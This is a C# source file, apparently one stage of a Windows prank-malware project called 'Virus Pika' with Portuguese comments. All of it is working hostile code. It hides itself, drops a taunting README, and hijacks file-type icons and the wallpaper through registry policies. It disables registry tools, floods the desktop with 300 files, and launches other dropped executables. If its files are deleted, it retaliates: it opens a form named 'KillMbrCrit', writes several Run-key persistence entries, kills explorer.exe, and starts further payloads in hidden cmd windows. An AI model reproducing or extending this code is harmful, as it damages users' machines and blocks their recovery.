using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Speech.Synthesis;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Media;

namespace Virus_Pika__By_Waguinho_
{
    public partial class VirusPika03 : Form
    {
        SpeechSynthesizer fala = new SpeechSynthesizer();
        //SoundPlayer music;
        public VirusPika03()
        {
            InitializeComponent();
        //    music = new SoundPlayer(@"C:\Program Files\Temp\music.wav");
            
        }

        private async void VirusPika03_Load(object sender, EventArgs e)
        {
            this.Hide();
            string dirdesk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
           if (!File.Exists(dirdesk + @"\VIRUS PIKA.exe") || !File.Exists(dirdesk + @"\README_README_README_README_README_README_README.txt"))
            {
                File.Create(dirdesk + $@"\VIRUS PIKA.exe"); //arquivo do virus
                File.WriteAllText(dirdesk + @"\README_README_README_README_README_README_README.txt", "OPA! SEU PC ACABA DE SER INFECTADO PELO VÍRUS PIKA.exe!"+ Environment.NewLine +"FIQUE TRANQUILO! VOCÊ AINDA PODE USAR SEU PC ENQUANTO ELE É INFECTADO"+ Environment.NewLine + Environment.NewLine + "" +
                " "+Environment.NewLine+"     ASS: Waguinho (:");//arquivo do virus
            }
            
           
            await Task.Delay(10000);
           // music.PlayLooping();
            if (File.Exists(@"c:\program files\Temp\sound.exe") || File.Exists(@"c:\program files\Temp\fcls.exe"))
            {
                 Process.Start(@"c:\program Files\Temp\sound.exe");
                 Process.Start(@"c:\program files\Temp\fcls.exe");
            }
           
           
            
           
            Regra.Start();//regra de não excluir arquivos do malware
            
           
            
            Random espera = new Random();
            await Task.Delay(espera.Next(10000, 20000));
            RegistryKey Paper = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            Paper.SetValue("Wallpaper", "C:\\Program Files\\Temp\\sus.jpg");

            RegistryKey stilo = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            stilo.SetValue("WallpaperStyle","2");

            RegistryKey nmude = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
            nmude.SetValue("NoChangingWallpaper",1, RegistryValueKind.DWord);

            RegistryKey iconexe = Registry.ClassesRoot.CreateSubKey(@"exefile\DefaultIcon");
            iconexe.SetValue("",@"C:\Program Files\Temp\Icon.ico");

            RegistryKey icontxt = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            icontxt.SetValue("", @"C:\Program Files\Temp\Icon.ico");

            RegistryKey icondll = Registry.ClassesRoot.CreateSubKey(@"dllfile\DefaultIcon");
            icondll.SetValue("", @"C:\Program Files\Temp\Icon.ico");

            RegistryKey iconlnk = Registry.ClassesRoot.CreateSubKey(@"lnkfile\DefaultIcon");
            iconlnk.SetValue("", @"C:\Program Files\Temp\Icon.ico");

            RegistryKey desreg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            desreg.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            await Task.Delay(espera.Next(20000, 30000));
            var time = DateTime.Now;
           
            
            

            //SPAM DE 300 ARQUIVOS NA ÁREA DE TRABALHO

            for (int i = 0; i < 300; i++)
            {

                File.Create(dirdesk + $"\\VIRUS PIKA({i}).exe"); 

            }
            

            if (File.Exists(@"C:\Program Files\Temp\spk01.speak")== false)
            {
                File.Create(@"C:\Program Files\Temp\spk01.speak");
                fala.Speak($"Olá! Muito bom dia, boa tarde ou boa noite! Seu pc foi infectado pelo Vírus pica em {time}. Siga as regras para evitar o pior.");
            }
            string dirtemp = @"C:\Program Files\temp";
            string windows = @"C:\windows";
            string c = @"C:\";
            string apptemp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp";

           
            if (File.Exists(dirtemp + @"\chk.exe"))
            {
                Process.Start(dirtemp + @"\chk.exe");
            }
            
            if (File.Exists(windows + @"\k7.exe"))
            { 
                Process.Start(windows + @"\k7.exe");
            }
            
            if (File.Exists(c + @"cuL.exe"))
            {
                Process.Start(c + @"cuL.exe");
            }
            
            if (File.Exists(apptemp + @"\kkk.exe"))
            {
                Process.Start(apptemp + @"\kkk.exe");
            }

            VirusPika04 pika04 = new VirusPika04();
            pika04.Show();

           // await Task.Delay(5000);
            
            

           
           
        }

        private void Regra_Tick(object sender, EventArgs e)
        {
            //Regra.Stop();

            var dir1 = @"C:\Program Files\Temp";
            var dir2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var temp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp";

            if (!File.Exists(dir1 + @"\pika.exe") || !File.Exists(dir1 + @"\fiufiu.wav") || !File.Exists(dir1 + @"\zapzap.wav") || !File.Exists(dir1 + @"\sus.jpg") || !File.Exists(dir1 + @"\icon.ico") || !File.Exists(dir1 + @"\lol.exe") || !File.Exists(@"C:\lol.exe")
                || !File.Exists(dir2 + @"\VIRUS PIKA.exe") || !File.Exists(dir2 + @"\README_README_README_README_README_README_README.txt") || !File.Exists(dir1 + @"\music.wav") || !File.Exists(dir1 + @"\gdi00.exe") || !File.Exists(dir1 + @"\gdi01.exe") || !File.Exists(dir1 + @"\gdi02.exe") || !File.Exists(dir1 + @"\gdi03.exe")
                || !File.Exists(dir1 + @"\gdi04.exe") || !File.Exists(dir1 + @"\fcls.exe"))
            {
                Regra.Stop();

                KillMbrCrit killcrit = new KillMbrCrit();
                killcrit.Show();

                RegistryKey ereg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                ereg.SetValue("DisableRegistryTools",0 ,RegistryValueKind.DWord);

                RegistryKey rsod = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                rsod.SetValue("Rsod", @"C:\Program Files\temp\RBSOD.exe");
                
                RegistryKey dth = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                dth.SetValue("dth", @"C:\windows\dth.exe");
               
                RegistryKey nope = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                nope.SetValue("nope", @"C:\nope.exe");
                
                RegistryKey fds = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                fds.SetValue("fds", temp + @"\fds.exe");
                
                Process.Start("taskkill", "/f /im explorer.exe");

                RegistryKey desreg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                desreg.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

                
                if (File.Exists(@"C:\Program Files\Temp\RBSOD.exe"))
                {
                    Process.Start(@"C:\Program Files\Temp\RBSOD.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();    // RBSOD.EXE
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im chk.exe";

                    Process.Start(tkk);
                }

                else if (File.Exists(@"C:\Windows\DTH.exe"))   //CÓPIA PASTA WINDOWS
                {
                    Process.Start(@"C:\Windows\DTH.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im chk.exe";

                    Process.Start(tkk);
                }
                else if (File.Exists(@"C:\NOPE.exe"))   //CÓPIA PASTA C:
                {
                    Process.Start(@"C:\NOPE.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im chk.exe";

                    Process.Start(tkk);

                }
                else if (File.Exists(temp + @"\fds.exe"))   //LOCAL NA PASTA %TEMP% (USUARIO)
                {
                    Process.Start(temp + @"\fds.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im chk.exe";

                    Process.Start(tkk);
                }
            }
        }
    }
}
